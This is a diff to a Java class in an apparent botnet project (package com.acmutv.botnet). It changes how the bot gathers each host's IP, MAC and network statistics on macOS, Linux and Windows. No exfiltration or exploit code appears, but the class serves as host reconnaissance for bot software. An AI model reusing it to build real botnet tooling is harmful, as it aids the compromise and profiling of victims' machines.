@@ -30,6 +30,7 @@ import com.acmutv.botnet.core.exception.BotAnalysisException;
 import com.acmutv.botnet.tool.net.ConnectionManager;
 import com.acmutv.botnet.tool.runtime.LinuxSysInfoTools;
 import com.acmutv.botnet.tool.runtime.MacOsxSysInfoTools;
+import com.acmutv.botnet.tool.runtime.WindowsSysInfoTools;
 
 import lombok.AllArgsConstructor;
 import lombok.Data;
@@ -66,26 +67,20 @@ public class NetworkFeatures {
 	private String CurrentNetworkInformation;
 
 	/**
-	 * Network Services of the host
+	 * Network Statistics
 	 */
-	private String NetworkServices;
-
-	/**
-	 * Network Interfaces
-	 */
-	private String NetworkInterfaces;
-
-	/**
-	 * Network Hardware Ports
-	 */
-	private String NetworkPorts;
+	private String NetworkStatistics;
 	
 	/**
-	 * Current Routing Table
+	 * Tcp Connections
 	 */
-	private String RoutingTable;
-
-
+	//private String TcpConnections;
+	
+	/**
+	 * Udp Connections
+	 */
+	//private String UdpConnections;
+	
 	/**
 	 * Returns local network features.
 	 * @return local network features.
@@ -98,10 +93,9 @@ public class NetworkFeatures {
 		String ip = null;
 		String mac = null;
 		String currentNetworkInformation = null;
-		String networkServices = null;
-		String networkInterfaces = null;
-		String networkPorts = null;
-		String routingTable = null;
+		String networkStatistics = null;
+		//String tcpConnections = null;
+		//String udpConnections = null;
 
 		try {
 			ip = ConnectionManager.getIP();
@@ -118,20 +112,32 @@ public class NetworkFeatures {
 		if(osName.toUpperCase().equals("MAC OS X")){
 			MacOsxSysInfoTools osx = new MacOsxSysInfoTools();
 			currentNetworkInformation = osx.getCurrentNetworkInformation();
-			networkServices = osx.getLocalNetworkServices();
-			networkInterfaces = osx.getAllInterfaces();
-			networkPorts = osx.getNetworkHardwarePorts();
-			routingTable = osx.getRoutingTable();
+			networkStatistics = osx.getAllNetworkStatistics();
+			//tcpConnections = osx.getTCPCurrentConnections();
+			//udpConnections = osx.getUDPCurrentConnections();
 			
 		}else if (osName.toUpperCase().equals("LINUX")){
+			LinuxSysInfoTools linux = new LinuxSysInfoTools();
+			currentNetworkInformation = linux.getCurrentNetworkInformation();
+			networkStatistics = linux.getAllNetworkStatistics();
+			//tcpConnections = linux.getTCPCurrentConnections();
+			//udpConnections = linux.getUDPCurrentConnections();
 
 		}
 		else if (osName.toUpperCase().equals("WINDOWS")){
-
+			WindowsSysInfoTools win = new WindowsSysInfoTools();
+			currentNetworkInformation = win.getCurrentNetworkInformation();
+			networkStatistics = win.getAllNetworkStatistics();
+			//tcpConnections = win.getTCPCurrentConnections();
+			//udpConnections = win.getUDPCurrentConnections();
 		}else{
-
+			currentNetworkInformation = "Error: Not Found";
+			networkStatistics = "Error: Not Found";
+			//tcpConnections = "Error: Not Found";
+			//udpConnections = "Error: Not Found";
 		}
 
-		return new NetworkFeatures(ip, mac, currentNetworkInformation, networkServices, networkInterfaces, networkPorts,routingTable);
+		//return new NetworkFeatures(ip, mac, currentNetworkInformation, networkStatistics, tcpConnections, udpConnections);
+		return new NetworkFeatures(ip, mac, currentNetworkInformation, networkStatistics);
 	}
 }
